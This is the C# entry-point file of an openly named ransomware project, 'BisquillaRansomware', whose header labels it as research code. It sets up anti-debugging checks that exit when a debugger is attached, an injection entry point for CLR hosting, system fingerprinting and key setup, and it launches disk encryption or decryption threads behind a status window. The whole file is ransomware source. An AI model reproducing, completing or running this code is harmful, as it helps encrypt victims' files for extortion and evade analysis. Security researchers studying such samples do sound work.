/************************************************************************************************************
 * This code is created and maintened only for a research proposal. Please do not use for other proposes.   *
 * Author: Th3 0bservator                                                                                   *
 * Source: https://github.com/guibacellar/BisquillaRansomware                                               *
 * Site: https://www.theobservator.net                                                                      *
 ************************************************************************************************************/

using System;
using System.Diagnostics;
using System.Threading;

namespace BisquillaRansomware
{
    /// <summary>
    /// Ransomware EntryPoint
    /// </summary>
    class Program
    {
        private static Forms.FormMain formMain;
        private delegate void SimpleDelegate();
        private delegate void SimpleStringDelegate(String text);

        /// <summary>
        /// CMD EntryPoint
        /// </summary>
        /// <param name="args"></param>
        /// <returns></returns>
        static int Main(string[] args)
        {
            return EntryPoint(
                (args.Length > 0 && args[0] == "--decrypt" ? "D" : "E")
            );
        }

        /// <summary>
        /// Injection Entrypoint Method.
        /// This Method MUST be declared as "static int" and have "pwzArgmument" Parameter. Ref: https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/iclrruntimehost-executeindefaultappdomain-method
        /// </summary>
        /// <param name="pwzArgument">Optional argument to pass in.</param>
        /// <returns>Integer Exit Code</returns>
        static int EntryPoint(String pwzArgument)
        {

#if !DEBUG
            // BEGIN DEBUG DETECTION
            bool isDebuggerPresent = false;
            Common.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
            if (isDebuggerPresent || Debugger.IsAttached)
            {
                Environment.Exit(-1);
            }
            // END DEBUG DETECTION
#endif

            // Execute Encryption Sequence
            ThreadPool.QueueUserWorkItem(
                Do,
                pwzArgument == null ? "E" : pwzArgument
            );

            // Show UI
            formMain = new Forms.FormMain();
            formMain.UpdateStatus("Initializing");

            // Add UI Based Trace (Uncomment for Diagnostics Only)
            //Trace.Listeners.Add(new UITraceListener(formMain));

            formMain.ShowDialog();

            // Wait to Form Exit
            return 0;
        }

        /// <summary>
        /// Main Method
        /// </summary>
        /// <param name="args"></param>
        /// <returns></returns>
        static void Do(object operation)
        {

#if DEBUG
            // Debug FingerPrint Generation
            string fp = null;
            ComputerIdStrategy.GenerateFP(ref fp);

            Trace.WriteLine("[+] System FingerPrint: " + fp);

#endif

            // Handle Basic Files
            CriptoKeyManager.EnsureLocalPublicKey();

            ThreadStart ts = null;

            // Handler Operation
            if ("E".Equals(operation))
            {
                // Create ThreadStart With Handler
                ts = new ThreadStart(Enc);
            }
            else // D - Decryption
            {
                // Create ThreadStart With Handler
                ts = new ThreadStart(Dec);
            }

            // Initialize and Start Operation Thread
            Thread t = new Thread(ts);
            t.Priority = ThreadPriority.BelowNormal;
            t.IsBackground = true;
            t.Start();

            t.Join();

            // Result Message to UI
            if ("E".Equals(operation))
            {
                // Update Status
                formMain.BeginInvoke(new SimpleStringDelegate(formMain.UpdateStatus), ConfigurationManager.MESSAGE_FEC);
            }
            else // Decryption
            {
                // Update Status
                formMain.BeginInvoke(new SimpleStringDelegate(formMain.UpdateStatus), ConfigurationManager.MESSAGE_FDC);
            }

            // Release Exit Button
            formMain.BeginInvoke(new SimpleDelegate(formMain.ReleaseExitButton));
        }

        private static void Enc()
        {
            formMain.BeginInvoke(new SimpleStringDelegate(formMain.UpdateStatus), ConfigurationManager.MESSAGE_FEP);
            EncryptionStrategy es = new EncryptionStrategy();
            es.EncryptDisk();
        }

        private static void Dec()
        {
            formMain.BeginInvoke(new SimpleStringDelegate(formMain.UpdateStatus), ConfigurationManager.MESSAGE_FDP);
            DecryptionStrategy ds = new DecryptionStrategy();
            ds.DecryptDisk();
        }
    }
}
